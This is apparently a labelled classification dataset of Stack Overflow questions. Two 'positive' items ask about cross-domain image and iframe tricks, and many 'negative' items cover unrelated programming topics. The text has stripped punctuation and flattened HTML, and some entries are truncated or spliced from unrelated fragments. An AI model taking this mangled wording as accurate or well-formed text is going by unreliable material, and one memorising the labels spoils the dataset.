Positive 13059 pemDisclaimer This is more of a general interest question rather than something I am actually considering doing, since there are less hacky ways to achieve the same thing.emp  pBut, out of curiosityp  pI can create custom codeltimg ...gtcode tags with JavaScript, which the browser will go and fetch. By choosing the URL for the codesrccode attribute of the image appropriately, this technically allows me to execute arbitrary server queries if my web server doesnt just return a static image file for the urlrequest, but actually processes it via some form of codeGETcodeservlet.p  pThe beauty of this is that it can be used for crossdomain requests in pretty much any browser that supports images without opening yourself up for any of the vulnerabilities that a hrefhttpsen.wikipedia.orgwikiJSONP relnofollowJSONPa would, for example.p  pThe problem is that I cannot return any data from this sort of server query, since the crossdomain policies usually block any sort of pixelaccess to the image...p  pOr can Ip  pI should be able to at least return two small unsigned integers in the range of 1 to maybe 1000  or more by generating a blank image with a certain width and height, which the browser then allows me to retrieve no matter where the image was loaded from, correctp  pAre there other such tricks I can use to send even more information along with the image And what limitations would I face in trying to get at the informationp  pAs an example, could the server set a cookie when returning the image If so, I could probably only access that cookie from the same domain, right So it wouldnt be useful for crosssitescripting except if the client doesnt need to care about the info in the cookie, but the server does.p  pOr could I, as another example, somehow change the images codesrccode by having the server reply with a redirect in such a way that I can retrieve the redirecttarget in JavaScriptp  pCrazy ideas welcome p  pstrongNOTEstrongp  pThis question is strongnotstrong meant as very broad received close request There are only a very limited number of properties that an HTML codeimgcode tag has that could be manipulated by a server and then read by a client. Image width and height might in fact be the only ones at least I couldnt find any others. Im just asking whether there are more. There should only be very few other properties out there, if any.p

Positive 13059 pI am currently hitting an issue where it would be helpful to have a unique ID for multiple frames on different domains, where the unique ID is publicly accessible to other frames that have a reference to that frame e.g., the parent, a child iframe.  Clearly, each browser knows that each frame is unique and manages that information somewhere.p  pThis issue comes up due to the HTML postMessage protocol.  If you start to stack iframes or have duplicate iframes e.g., same URL, but two separate instances as iframes, it can get quite difficult to tell the difference between a message from frame A versus frame B.  For example, consider the following situationp  ul liParent Frame www.myparent.comParent.html  ul liChild Frame 1 www.mychild.comChild.htmlli liChild Frame 2 www.mychild.comChild.htmlli liChild Frame 3 www.mychild.comChild.htmlli ulli ul  pAssume we send a message from the Child Frame 1 that we want to reach all other child frames.  After it has gone through the postMessage process, how do we even know that it came from Child Frame 1  The URL for each is identical, so that is no help.  There are a few solutions e.g., having each child send an initial message to register a unique sender id that theyll attach to each of their following messages, having the parent give each frame a URL parameter that can be used to distinguish between them.  However, the simplest solution would be if there was some property like frame.uuid similar to frame.name, which both the child and the parent frame are aware of.  p  pWhile it is clearly possible to emulate this functionality using HTML, I am building a library intended to make this process as easy as humanly possible, so if I can readily automate inferring these links and surviving when two iframes have the same name, that would be important. It also needs to work for crossdomain purposes, so simply setting random DOM properties isnt an option.  More generally, I would be very interested in seeing a list of which frame properties are accessible for crossdomain purposes, in case it is possible to easily overload one to carry this uuid information.p

Negative 13059 pI am looking for a way to connect to Facebook by allowing the user to enter in their username and password and have our app connect to their account and get their contacts so that they can invite them to join their group on our site.  I have written a Facebook app before, but this is not an app as much as it is a connector so that they can invite all their friends or just some to the site we are working on.p  pI have seen several other sites do this and also connect to Yahoo, Gmail and Hotmail contacts.  I dont think they are using Facebook Connect to do this since it is so new, but they may be.  p  pAny solution in any language is fine as I can port whatever example to use C.  I cannot find anything specifically on Google or Facebook to address this specific problem.  Any help is appreciated.  p  pI saw a first answer get removed that had suggested I might need to scrape the friends page.  The more I look around, this might be what I need to do.  Any other way I think will require the person to add it as an app.  I am wondering how a answer can get removed, maybe that user deleted it.p

Negative 13059 pWe need to develop some kind of buffer management for an application we are developing using C.p  pEssentially, the application receives messages from devices as and when they come in there could be many in a short space of time. We need to queue them up in some kind of buffer pool so that we can process them in a managed fashion.p  pWe were thinking of allocating a block of memory in 256 byte chunks all messages are less than that and then using buffer pool management to have a pool of available buffers that can be used for incoming messages and a pool of buffers ready to be processed.p  pSo the flow would be Get a buffer process it Release buffer or Leave it in the pool. We would also need to know when the buffer was filling up. p  pPotentially, we would also need a way to peek into the buffers to see what the highest priority buffer in the pool is rather than always getting the next buffer.p  pIs there already support for this in .NET or is there some open source code that we could usep

Negative 13059 pFinally, I have a question to ask on Stack Overflow p  pThe main target is for Java but I believe it is mostly language agnostic if you dont have native assert, you can always simulate it.p  pI work for a company selling a suite of softwares written in Java. The code is old, dating back to Java 1.3 at least, and at some places, it shows... Thats a large code base, some 2 millions of lines, so we cant refactor it all at once.br  Recently, we switched the latest versions from Java 1.4 syntax and JVM to Java 1.6, making conservative use of some new features like codeassertcode we used to use a DEBUG.ASSERT macro  I know codeassertcode has been introduced in 1.4 but we didnt used it before, generics only typed collections, foreach loop, enums, etc.p  pI am still a bit green about the use of assert, although I have read a couple of articles on the topic. Yet, some usages I see leave me perplex, hurting my common sense...  So I thought I should ask some questions, to see if I am right to want to correct stuff, or if it goes against common practices. I am wordy, so I strongboldedstrong the questions, for those liking to skim stuff.p  pFor reference, I have searched emassert javaem in SO and found some interesting threads, but apparently no exact duplicate.p  ul lia hrefhttpstackoverflow.comquestions271526howtoavoidnullstatementsinjava relnofollow title How to avoid  null statements in java  How to avoid  null statements in java a and a hrefhttpstackoverflow.comquestions302736howmuchnullcheckingisenough relnofollow titleHow much null checking is enoughHow much null checking is enougha are quite relevant, because lot of asserts we have just check if variable is null. At some places in our code, there are usages of the null object eg. returning codenew String[0]code but not always. We have to live with that, at least for maintenance of legacy code.li liSome good answers also in a hrefhttpstackoverflow.comquestions298909javaassertionsunderused relnofollow titleJava assertions underusedJava assertions underuseda.li liOh, and SO indicates with reason that a hrefhttpstackoverflow.comquestions129120whenshouldiusedebugassert relnofollow titleWhen should I use Debug.AssertWhen should I use Debug.Asserta question is related too nice feature to reduce duplicates.li ul  pFirst, main issue, which triggered my question todayp  precodeSubDocument aSubDoc  documents.GetAt i  assert aSubDoc  null  if  aSubDoc.GetType  GISDOC      continue  assert aSubDoc.GetDoc  null  ContentsInfo ci  ContentsInfo aSubDoc.GetDoc codepre  pemYes, we use MS CC stylecode conventions. And I even like it coming from same background So sue us.embr  First, the codeassertcode form comes from conversion of codeDEBUG.ASSERTcode calls. I dislike the extra parentheses, since assert is a language construct, not no longer, here a function call. I dislike also codereturn foocode br  Next, the asserts dont test here for invariants, they are rather used as guards against bad values. But as I understand it, they are useless here the assert will throw an exception, not even documented with a companion string, and only if assertions are enabled. So if we have codeeacode option, we just have an assertion thrown instead of the regular NullPointerException one. That doesnt look like a paramount advantage, since we catch unchecked exceptions at highest level anyway.br  strongAm I right supposing we can get rid of them and live with that ie. let Java raise such unckecked exceptionstrong or, of course, test against null value if likely, which is done in other places.p  pSide note should I have to assert in the above snippet, I would do that against ci value, not against the getter even if most getters are optimizedinlined, we cannot be sure, so we should avoid calling it twice.p  pSomebody told, in the last referenced thread, that public methods should use tests against values of parameters usage of the public API and private methods should rely on asserts instead. Good advice.br  Now, both kinds of methods must check another source of data external input. Ie. data coming from user, from a database, from some file or from the network, for example.br  In our code, I see asserts against these values. I always change these to real test, so they act even with assertions disabled these are not invariants and must be properly handled.br  I see only one possible exception, where input is supposed constant, for example a database table filled with constants used in relations program would break if this table is changed but corresponding code wasnt updated.br  strongDo you see other exceptionsstrongp  pAnother relatively frequent use I see, which seems OK in the default of a switch, or at the end of a series of  codeelse ifcode testing all possible values these cases date back before our use of enums, there is often an codeassert false  Unexpected value for stuff   stuffcodebr  strongLooks legitimate for me these cases shouldnt happen in production, what do you thinkstrong beyond the no switch, use OO advices which are irrelevant here.p  pAnd finally, strongare there any other useful use cases or annoying gotchasstrong I missed here probablyp

Negative 13059 pI thought I would rewrite this question same iteration.  The original was how to wrap a repository pattern around an EAVCR database.  I am trying a different approach.p  pstrongQuestion How could you code a data repository in a factory design pattern waystrong  I have a fixed number of entities, but the attributes to these entities are fairly customer specific.  They advertise Products which are all similar, but each customer attaches different information to them based on their business model.  For example, some care about the percent slab off waste while others care about the quantity of pounds sold.  Every time we find another customer, we add a bunch of fields, remove a bunch of fields, and then spend hours keeping each solution current to the latest common release.p  pI thought we could put the repository classes in a factory pattern, so that when I know the customer type, then I know what fields they would use.  Practical  Better way  The web forms use User Controls which are modified to reflect what fields are on the layouts.  We currently join the fields found on the layout to the fields found in the product table, then CRUD common fields.p  pstrongPrevious question contentstrongp  pWe have an EAVCR data model that allows different classes for the same entity.  This tracks products where customers have wildly different products.  Customers can define a class of product, load it up with fields, then populate it with data.  For example, br p  pcodeProduct.TextFields.Namecodebr  codeProduct.TextFields.VitaminEContentcodep  pstrongAny suggestion on how to wrap a repository pattern around thisstrongbr br  We have a three table EAV a Product table, a value table, and a meta table that lists the field names and data types we list the data types because we have other tables like Product.Price and Product.Price Meta data, along with others like Product.Photo.  Customers track all kinds of prices like a competitors percent off difference as well as on the fly calculations.p  pWe currently use Linq to SQL with C.p  pEditp  pI like the Dynamic Query Linq below.  The idea behind our DB is like a locker room locker storage.  Each athlete or customer organizes their own locker in the way they wish, and we handle storing it for them.  We dont care whats in the locker as long as they can do what they need with it.p  pVery interesting...  The objects passed to the repository could be dynamic  This almost makes sense, almost like a factory pattern.  Would it be possible for the customer to put their own class definitions in a text file, then we inherit them and store them in the DBp

Negative 13059 pIve been looking into a way of passing the client ip as well as the userid and password from a JAAS login page to the JAAS login module implementation in my web code.  JAAS only allows the user id and password to be passed to the login module.  My idea is to have a java script code to append the ip address to the user id and then call the form submit.  I just dont have the right java script code to do this.  Can you helpp  pThe web page has two input fields, juserid and jpassword, which the JAAS code knows to look it.  So what javaScript code can I use to add the ip address to the juserid field before the form submit.  I was thinking of ipaddressuserid and then in my login module Id take the ip address off the userid.p

Negative 13059 pSo like many developers before me, I am at the crossroads of choosing an ORM to learn thoroughly and move forward with for future projects. I have been playing with Entity Framework and so far like what I see, although I have only tried simple things, CRUD with clearly defined table relationships with a 11 tableentity mapping. I did some googling on Entity Framework and found mostly negative feedback... what concerns me the most is the complexity of the mapping xml and generated object classes... As well as the fact that they are dependent on component classes of the EF and therefore need to be respected as such when it comes to object model design considerations. As of now I am leaning towards NHibernate... for the relative simplicity of the mapping files and the fact that it can work with POCO objects that I craft to meet my object model design needs. There is even a LINQ provider for it, as well as third party code generation tools. However... I dont wish to throw EF out the window just yet. Does anyone know of a successful production app written with EF Or on the technical side, any reasons I would want to lean towards EF now e.g. has corporate backing, is new and therefore more likely to grow in feature set over time while NH has reached the equilibrium of maturity I dont mean to start a color war here, Im just looking for positive things people may have to add about the EF before I make my decision.p  pThanksp

Negative 13059 pI have a C application which uses a COM component.  This COM component require a message pump Application.Run to do its processing.  This means its been stuck on the main thread.  But I recently discovered that its possible to start another Application.Run on another thread which gets its own ApplicationContext.p  pSo I want to host the COM component on its own thread inside its own Application.Run, but I cant figure out how to get things started on the new thread without creating a UI form.p  pThe WindowsFormsSynchronizationContext I need to communicate with the thread doesnt get created until Application.Run. But once Application.Run is called, I cant figure out how to get at the SynchronizationContext.  If I could just raise a single event on that thread, I could use that to bootstrap the whole thing create the COM object, etc., but there doesnt seem to be anywhere to hook into the new event loop without a form.p  pIve tried all kinds of convoluted things, like installing a message filter no messages get raised on the new thread, copying the execution context into another thread and trying to retrieve the SynchronizationContext from there it refuses to copy the ExecutionContext of an already running thread, retrieving Thread.CurrentContext before starting Application.Run and then calling DoCallbBack the DoCallback ends up on the original thread, etc.  Nothing Ive tried works.p
Negative 13059 pIve got an application running on Apache Tomcat 5.5 on a Win2k3 VM.  The application serves up XML to be consumed by some telephony appliances as part of our IVR infrastructure.  The application, in turn, receives its information from a handful of SOAP services.p  pThis morning, the SOAP services were timing out intermittently, causing all sorts of Exceptions.  Once these stopped, I noticed that our application was still performing very slowly, in that it took it a long time to render and deliver pages.  This sluggishness was noticed both on the appliances that consume the Tomcat output, and from a simple test of requesting some static documents from my web browser.p  pRestarting Tomcat immediately resolved the issue.p  pCracking open the localhost log, I see a ton of these errors, right up until I restarted Tomcatp  precodeWARNING Exception thrown whilst processing POSTed parameters   java.net.SocketException Software caused connection abort recv failed codepre  pAfter a big of Googling, my working theory is that the SOAP issue caused my users to get errors, which caused them to make more requests, which put an increased load on the application.  This caused it to run out of available sockets to handle incoming requests.  p  pSo, heres my quandarybr  1. Is this a valid hypothesis, or am I just in over my head with HTTP and Tomcatbr  2. If this is a valid hypothesis, is there a way to increase the size of the socket queue, so that this doesnt happen in the futurep  pThanksbr  IVR Avengerp

Negative 13059 pI have a series p  precodeS  im  i2m  ...............   ikm  mod m     0 lt i lt m, k may be very large up to 100,000,000,  m lt 300000 codepre  pI want to find the sum. I cannot apply the Geometric Progression GP formula because then result will have denominator and then I will have to find modular inverse which may not exist if the denominator and m are not coprime.p  pSo I made an alternate algorithm making an assumption that these powers will make a cycle of length much smaller than k because it is a modular equation and so I would obtain something like 2,7,9,1,2,7,9,1....  and that cycle will repeat in the above series. So instead of iterating from 0 to k, I would just find the sum of numbers in a cycle and then calculate the number of cycles in the above series and multiply them. So I first found codeim mod mcode and then multiplied this number again and again taking modulo at each step until I reached the first element again.p  pBut when I actually coded the algorithm, for some values of i, I got cycles which were of very large size. And hence took a large amount of time before terminating and hence my assumption is incorrect.p  pSo is there any other pattern we can find out Basically I dont want to iterate over k. So please give me an idea of an efficient algorithm to find the sum.p

Negative 13059 pThis is a weird question, but is there a standard way to manipulate the contents of a codevalistcode before passing it to another function For instance, suppose I have two functions, codesumcode and codevsumcodep  precodeint vsumint n, valist ap      int total  0     for int i  0 i lt n i          total  vaargn, int     return total   int sumint n, ...      valist ap     vastartap, n     int total  vsumn, ap     vaendap     return total  codepre  pIf I call codesumcode as codesum4, 1, 2, 3, 4code, I expect to get the result 10. Now lets suppose that instead of calling codevsumcode directly, codesumcode calls an intermediate function, codevsumstubcode which does the followingp  precodeint vsumstubint n, valist ap      valist tempap     vacopytempap, ap     for int i  0 i lt n i          int arg  ampvaargap, int         arg  2          vaendtempap     return vsumn, ap  codepre  pNow when I call codesum4, 1, 2, 3, 4code, I should get back the result 20, since codevsumstubcode increments all of the values in the codevalistcode by 2. This doesnt compile of course since you cant take the address of the result of codevaargcode. Is there another way to do this though Im working in C99.p  hr  pstrongBackgroundstrongp  pIm working on a library that does some pointer translation so that data may be stored on the heap in a more efficient format. Programs are compiled with a custom transformation which converts calls to library functions like codeprintfcode to my own stub functions e.g., codehcprintfcode. codehcprintfcode needs to translate any pointer arguments strings intended for codescode before passing the arguments to the real codeprintfcode function.p  pstrongEditstrong Heres a code example. Lets say we have a string codefoocode. codefoocode is dynamically allocated with a modified version of codemalloccode which returns a fake pointer. The compiler modifies the program so that it can deal with fake pointers. So this worksp  precodechar foo  fakemalloc4 fakestrcpyfoo, foo codepre  pI want to write a codefakevprintfcode function like this in pseudocodep  precodeint fakevprintfconst char format, valist args      for each pointer argument p in args         translate p to q, a real pointer to contiguous memory         replace p with q in args          return vprintfformat, args  codepre  pThe program would call codefakevprintfcode just like the original codevprintfcode using the fake pointer. codefakevprintfcode translates the fake pointer to a real pointer that the real codevprintfcode can use.p

Negative 13059 pIn C, a superclasss static members are inherited into the subclasses scope.

With the loops you can see everything right there in one file.p

There is probably a simple solution to this but I cant find itp  pI have a custom HttpHandler that I want to process a request, log certain info then enter the details in the database. Im using NUnit and Castle Windsor.p  pSo I have two interfaces one for logging the other for data entry, which are constructor injected. I quickly found out that there is no way to call the constructor as the default parameterless constructor is always called instead.p  pSo I thought I would use Setter injection and let Castle windsor sort it out. This actually works as when I use codecontainer.ResolveltCustomHttpHandlergtcode I can check that the logger is not null. In ApplicationStart in Global.asax.csp  pThe problem is although Castle Windsor can create the instance the http application is not using it I thinkp  pBasically the whole reason for doing it this way was to be able to test the logger and data repository code in isolation via mocking and unit testing.p  pAny ideas how I can go about solving this problemp  pThanksp

My searches on this arent turning up much of anything.p  pBasically, it would just be where I do a database call and get the contents of a class, then I want to instantiate it. Any advice is appreciated on how to best do this sort of thing.p  pEDIT In response to the idea of a malicious codeinitcode in the class, these are only for things like forms or models where it is tightly controlled through validation what goes in the class, there would never be an codeinitcode in the class and it would be basically impossible, since I would validate everything server side, to put anything malicious in the class.p

Im currently working on the DAL.p  pIm not connecting to an external database yet I had hoped to have my DAL classes utilize inmemory dataTables until the DB is in place.  p  pIn .NET its very easy to make inmemory dataTables, select from them, add to them, and remove from them.  But, in Java, Ive been unable to find something that does the same thing.p  pI was considering replacing the dataTables with a collection of strongly typed objects but that would require adding references to Business layer inside of the DAL and I thought that was a nono.p  pCan someone help a confused developer out  If this whole approach is flawed, what would you do  If I missed the equivalent of a dataTable in Java  what is itp

Negative 13059 pI have entity objects that are synchronized with a database.

The logic of the method compares their primary key and if has not been assigned by the database yet, their secondary key if they have one.p  pA lot of code scenarios would be easier if I used Equals for comparing keys e.g. I could check a list just using Contains, but I would find it confusing, if Equals only compared the keys and didnt check all properties.p  pMy scenario is an NTier system with selftrackingentities.

Negative 13059 pI am extending MVC 3 validation by using custom ValidationAttributes on the server side and have implemented IClientValidatable to output html5 data attributes for my custom validation. I then used jQuery.validator.addMethod to add my client side validation. My final task is to write the adapter that converts the html5 data attributes into a format that the jQuery validator understands. My validation takes in several values so I need to use the jQuery.validator.unobtrusive.adapters.add rather than one of the more straightforward functions such as addSingleVal.p  pWithin my adapter, it would be useful to use several of the functions in the jquery.validate.unobtrusive file such as setValidationValues and getModelPrefix but if I am not mistaken, these function are inside a closure making them only available within that closure.

Negative 13059 pGamemaker is a neat tool which allows for some good RAD. However it has quite a few shortcomings. One of those is the lack of a good standard library.br True you have the ds type members, but those are quite lacking. The priority queue for example is only a readonce type its destroyed in the process. The sort function for lists uses a terrible slow method. While never officially stated, I suspect it uses bubble sort. And there simply is no build in method for linked lists. On top of that simple member access is slower than it should be.p  pNow one could actually create those things in the native language. However it becomes quite slow as the interpreter is slow. I.e. writing a quicksortheapsort was in many cases slower than the built in sort. Writing my own linked lists using special objects for each node had too much overhead. each object in gamemaker does lots of things each step.p  pSo now Im looking at writing a C layer for the standard library. I hope to add some extra functionality hash tables amp linked lists are the prime target as well as allow for better algorithms. For most of the problems I already have an idea how to tackle it, except for 1 big problemp  pAll C libraries use iterators to identify an item. Gamemaker only allows for doubles or cstyle character arrays to be passed to and from dlls.br How would I circumvent this Not returning the index of an item is quite silly, so I have to find a way to map those iterators into doubles.p  pWhat is a good idea for this Am I best off simply rewriting all datastructures so the iterators are guaranteed to have a 1 on 1 map to double or actually double  datastructure index Or are there better methodsp  pP.s. why isnt the gamemaker tag there yetp

Negative 13059 pI am making ajax and json calls within my site that has a session timeout of 120 minutes on the server side. After the time has expired and a user tries to make an ajax or json call from a page that has been loaded, the call gets made I just sit there with no responds. I am using a sturts.xml file to handle all my actionurl calls and this file has an interceptor that runs with every call that gets made to the server. The interceptor checks if you are logged in and sends you to the login screen if you are not. The problem is that the ajax and json calls will are all set up like belowp  pI had to replace all lt and  tags with  and  since the editor wont show them, so just replace the brackets with  and ltp  paction namesomeAction classActionClass methodsomeMethod    result namesuccess typejson     param nametargetresultparam       param namepatterns .classparam    result actionp  pThere is a global result that will be called when the interceptor wants to send you to the login page as specified belowp  presult namelogin typetilessite.loginresultp  psince the interceptor sends back a result of login and not success, the ajax and json calls never receives the result it is expecting and when I look at the responds the browser receives it is the raw html of the page I am expecting to be redirected to. Any other type of server call works and sends you to the login screen if your session has timed out. If i try to make an action call as a regular lin, it will work, but I cant make any ajax or json calls and get it to work. Any suggestionsp

Negative 13059 pWhat are the best practices for updating clientside SSL certificates without user interactionp  pTo be more specificbr I have a server with SSL private keypublic x.509 certificate. All clients will communicate with this server through SSL.  In order to establish SSL connection all clients need to import the servers public certificate to their trusted locations truststore.p  pGetting the servers certificate at client install time is not a problem because the installer can contact the server by SSL and get the servers public key or the companys Root Certificate. After that the installer can show the certificate to the user for visual validation and this is secure enough.p  pWhat will happen after the server certificate or the company CA expiresbr Or what will happen if the server certificate is accidentally changedp  pWhat are the best practices to automatically update all clients with the new server SSL certificate CA Having in mind that after installation the clients are background processes and the is not visual user interaction possible.p  pOf course the easiest way is to manually update all clients by the infrastructure administrator. p  pIm wondering if there are some known good practices to automatically update the clients certificates without user interventionp

Negative 13059 pIm fairly new to R, but Im making good progress. Ive been able to bend ggplot2 to my will with the exception of one thing the order that the categorical labels are plotted along the x axis in my boxplot.

However, the axis goes in the order of the labels the boxplot of 1,2,3 being closest to the origin, 10,11,12 in the middle, 7,8,9 on the right of the graph. What I want is for the boxplot data to start with the subset that has the highest within label average and proceed in decreasing order. I can average within each label by codemeandfLabel[13]code and codemeandfLabel[46]code etc, but I cant figure out how to get the graph to display such that the plots for the labels go not in the order they appear in codefactordfLabelcode i.e. A, B, C along the x with boxes at 2, 11, 8 but in order of highest withinlabel average to lowest i.e. B, C, A along the x and the boxes then at 11, 8, 2. p  pIm thinking I would create a vector consisting of each withinlabel average and somehow pass that to ggplot to specify the axis order, but I cant figure out how to create the vector to start with.p  pWhat I need to know is p  pWhats the best way to get a vector consisting of the averages of each label, in order from highest to lowest How do I pass that vector to ggplot so that it orders the xaxis by those values, while still labeling the x axis with codefactordfLabelcodep  pIm open to suggestions for other ways to display the data as well, but I think Im pretty close to what I want amp the mean amp spread of the values within a given label is important.p

Negative 13059 pI am attempting to query a table for a limited resultset in order to populate an autocomplete field in javascript. I am, therefore, using a LIKE operator with the partial string entered.p  pIf I have, for example, a table such asp  precodetblPlaces id     country 1      Balanca 2      Cameroon 3      Canada 4      Cape Verde 5      Denmark codepre  pFor the sake of this example, lets say I want two rows returning  and yeah, for this example, I made up a country there  I want to prioritize any instance where a partial string is matched at the beginning of country. The query I began using, therefore isp  precodeSELECT id, country FROM tblPlaces WHERE country LIKE ca LIMIT 2 codepre  pThis returned Cameroon and Canada as expected. However, in instances where there are no two names in which the string is matched at the beginning of a word such as de, I want it to look elsewhere in the word. So I revised the query to becomep  precodeSELECT id, country FROM tblPlaces WHERE country LIKE ca LIMIT 2 codepre  pThis then returned Cape Verde and Denmark, but in doing so broke my original search for ca, which now returns Balanca and Cameroon.p  pSo, my question is, how to go about this using a single query that will prioritize a match at the start of a word perhaps I need to use REGEXP I am assuming also that if the country column is indexed, these matches will at least be returned with subsequent alphabetical priority i.e. Cameroon before Canada etc.p  pThanks for any guidance.p

Negative 13059 pThis used to be easy up to Rails 3.0 thin prefixfoobar was all that was needed. For those who are using Passenger Phusion, theres RackBaseURI  but Im on LighttpdThin, a combination which is not that popular anymore. p  pIve tried to start thin with R config.ru and put map foobar do ... into config.rb, but that doesnt solve the problems with assets still linking to  instead. I also tried setting config.assets.prefix  foobar which produces correct links in the HTML, but causes routing errors No route matches [GET] application.css  no foobar there.p  pThe only combination Ive found working so far is config.assets.prefix plus a scope around all routes. That seems messy both because its not DRY and because IMHO deploying to different locations shouldnt require you to edit routes.rb. And unfortunately that solution does not work for production, as the HTML will contain foobarapplication.css instead of foobarassetsapplication.css.p

Negative 13059 pI have a C app that is reading data from a stored procedure and then creates a message. I am using SqlDataReader to read the information from the database. Previously, I have had to create a new class every time I have a different type of message and it is getting out of control. By different, I mean a different number of columns andor different types of data each of the columns contain. I am trying to make it easier to add different message types and not sure how to dynamically format the data as I read it. I have tried to format the data after it has been read into my Data variables, but it its just junk because it gets formatted as the wrong type. So, the only way I currently see it to handle the data when I read into my variables and I cant figure out how.p  pMy format of my message is as followsp  precodeMessage    Subject    Text      MessageHeader1      MessageHeader2      Title      Header1      Header2      Header3      Data         Data1         Data2         Data3 codepre  pThe issue is that the Data variables could contain different type of information. It could currently contain strings, integers, Dates, Percents, etc. Is there a way to format the data based on another value or some other method so that the different type of data could be formatted correctly p  precodeif dr.Read      message.Subject  dr[Subject].ToString     message.MessageText  new AlertMessageText              MessageHeader1  dr[MessageHeader1].ToString,         MessageHeader2  dr[MessageHeader2].ToString,         Title  dr[Title].ToString,         Header1  dr[Header1].ToString,         Header2  dr[Header2].ToString,         Header3  dr[Header3].ToString,         MessageData  new ListltAlertMessageDatagt,        ...  while dr.Read      message.MessageText.MessageData.Addnew AlertMessageData                      Data1  string.Format0n0, dr[Data1],             Data2  string.Format0n0, dr[Data2],             Data3  string.Format0MMddyyyy, dr[Data3],     Formats Data as a Date            codepre

Negative 13059 pI would like to integrate Facebook into an iOS application I am building, however it seems there is no way to set up a Facebook Native iOS Application with an iOS application that is not already published and available in the App Store.  p  pWhen I Set up a Native iOS Application for my Facebook App from my Facebook developers account it requires that I fill in my App Store ID. However when I submit I get the following error messagep  blockquote   pYour iPhone App Store ID is invalid because the iTunes App Store   reports your app as being unavailable for iPhone and iPod touch.p blockquote  pI have set up my application on iTunes Connect, but I have not submitted my binary yet as I am in the process of building it, so I assume that this message is due to it being unavailable on the App Store.p  pThis seems like a catch 22 situation. I cant test my app until its in the App Store but I cant get my app in the AppStore until I have tested and built it. How can I test my iOS application with Facebook before releasep

Anyway the problem is the existing site places people into a category based on their address primarily the zip code, this is not working out because of odd shapes and user density so I would like to solve the problem by creating custom zones.  I am not looking for a proprietary solution because I would really like to accomplish this on my own, I just need some better places to start or better suggestions for searches.p  pI understand that I will need to create a map with my predetermined polygons.

Is it better just to scrap the code and rewrite itp  pI know there is not a simple answer so please feel free to post links to any literature that discusses stable floatingpoint code without the use of sentinel values andor refactoring floatingpoint code for speed.p  pThanksp

Negative 13059 pId like to implement a googlelike autosuggest functionality. Whats the best way to do it and are there any components already implemented that can help  p  pIm really bothered by how often requests should be sent. My guess is that a request should be  sent after some time passes. So, for instance when user wrights in a new character some sort of timer must be triggered, which, by the end, will trigger a function comparing inputs from the start of the timer and its ending. Judging on comparison made a decision whether to send or not is taken.Should I use threads for that. Wont it be a resourceintensive execution p  pOne more option make a whiletrue Thread, which gets text, sends request and update main thread results view. Though, Im not sure how its done in terms of Android.p  pThanks for any suggestions.p  pUPD Ive come up with a simple solution of using AsyncTasks.

Negative 13059 pWhat I am trying to do is something similar to how collaborative editor works. I want to allow two people to edit the same document. And for this I have to simulate an artificial caret. I can extract the other users activity in term of addition and deletion at specified location in a textarea.p  pI will then transmit the location, along with the action to the other document. There I need to carry out the required change at the sent coordinate. I have searched and found enough ways  to set the caret location and insert or delete text at the current caret location, but the problem is that the caret of the document moves to the location at which I make the change. p  pI dont want that, I want to have two carets, one each for the two users.  Transmit their changes to each other documents and make the changes at their respective locations, while showing two different carets.p  pI just need to know if there are certain libraries that I can use, or even if I have to make this on my own, then how and where do I start. I dont even know how a textarea is represented within a browser. How can I characterize locations within a textarea, if I know that then I save the locations in memory and make the changes based on the input received.p  pI hope I make sense, thanks for any help.p

For example, let codebigEndian  0x4969F52Fcode. Java will report code958290.94code, and VB.NET will report code958290.938code.

Negative 13059 pI have a JS Function which is called in document.ready. The intent is as it scrolls to the bottom window, itll load more from the JSON API.p  pThe API has the parameter offset and limit. Offset controls which subset of results you are seeing.

This sets a session cookie with the value 1 for the parent domain .company.com and sends the user to the desktop site.

Im elaborating this because it is included in this fiddle. p  pSo the problem is multiple initialization of the function which handles above functionality is not producing consistent result.

Negative 13059 pI am trying to implement a VisualSearch.js Query box but builds its facets from the information stored on the database using a REST interface.p  pFor Example an input facet could be User email and then as they type the first few letters the users emails are filtered down until the correct one is found.p  pThe issue I am finding is how do I implement this so that it only sends off a request for the user names when it has locked in that facet or more ideally, when the first letter is press so the search scope is minimized.  Otherwise it seems I would be loading all the facets and their values every time the page is loaded.  This is be huge set of queries being sent off if I also include other searchable objects and values etc.  It would be almost like loading all searchble elements of the whole database so they can then be filtered down.p  pAs a extra pice of info I am using a cakePHP backend for the REST API.p  pMany Thanks.p

Negative 13059 pI am trying to make use of Borlands codeTClientSocketcode component in nonblocking mode inside a multithreaded C Windows application. I am creating multiple threads classes derived from codeTThreadcode, each of which creates its own codeTClientSocketcode object. I then assign member functions of the thread class to act as event handlers for the codeOnConnectcode, codeOnDisconnectcode and codeOnSocketErrorcode events of the socket. The problem I am having here is that whenever I call the codeTClientSocketOpencode function from within the codeTThreadExecutecode function, the codeOnConnectcode event never fires. However, When I call the codeOpencode function from the VCL thread prior to the codeTThreadExecutecode function getting called, all of the events fire and I can use the threadsocket combination as I would like. Now I have not read anything in documentation that says that codeTClientSocketcode should not be used in nonblocking mode when used inside a thread, but it appears to me that there is perhaps something wrong conceptually in the way I am trying to use this class. Borland documentation is quite poor on the subject and these components have now been deprecated so reliable information is hard to come by. Despite being deprecated I have to use them as there is no alternative in the Builder 6 package I have. Can anyone please advise me if there is a rightwrong way to use codeTThreadcode and a nonblocking codeTClientSocketcode in combination. I have never had problems using it as part of the VCL thread and never had problems using TServerSocket before and I really cannot understand why some events are not firing.p

Negative 13059 pI have a unit test that calls into a class library by passing in codeHttpRequestMessagecode instances and receiving codeHttpResponseMessagescode instances back. Its very similar to testing a WebApi codeApiControllercode in this respect.p  pThe code Im testing adds cookies to the codeHttpResponseMessagecode, and expects to see those cookies in subsequent incoming codeHttpRequestMessagecode calls, which is how a browser or codeHttpWebRequestcode would behave.p  pIm not using codeHttpClientHandlercode because the requests arent actually going on the network, but are handed off to the product using the mocked up codeHttpMessageHandlercode that I initialize the codeHttpClientcode with. Therefore the cookie handling in codeHttpClientHandlercode is inaccessible to me. It seems that to get the cookie behavior I need, I will have to manually parse the cookies in the codeHttpResponseMessagecode and then manually serialize them to the codeHttpRequestMessagecode. That completely omits the logic that CookieContainer has for correctly applying cookies to the right requests, as well.p  pIs there an easier wayp

